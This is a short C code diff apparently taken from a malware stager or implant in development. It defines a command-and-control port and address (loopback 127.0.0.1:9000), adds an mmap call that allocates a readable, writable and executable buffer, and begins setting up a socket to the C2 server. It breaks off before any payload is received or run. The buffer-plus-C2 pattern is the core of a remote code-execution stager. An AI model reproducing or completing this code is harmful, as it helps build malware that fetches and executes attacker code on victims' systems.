@@ -1,10 +1,17 @@
 #include "syscall.h"
 
+#define STAGE 0
+#define SIZE 0x4000
+#define PROTECTION (PROT_EXEC | PROT_READ | PROT_WRITE)
+#define FLAGS (MAP_ANON|MAP_COPY)
+
 #define C2PORT 9000
 #define C2IP 16777343  // Because conversions are hard
 
 int main() {
     // And now you can code in C
+    char * buf = mmap(STAGE, SIZE, PROTECTION, FLAGS, -1, 0);
+
     struct in_addr server_ip = { C2IP };
     struct sockaddr_in server = {
         AF_INET, htons(C2PORT), server_ip
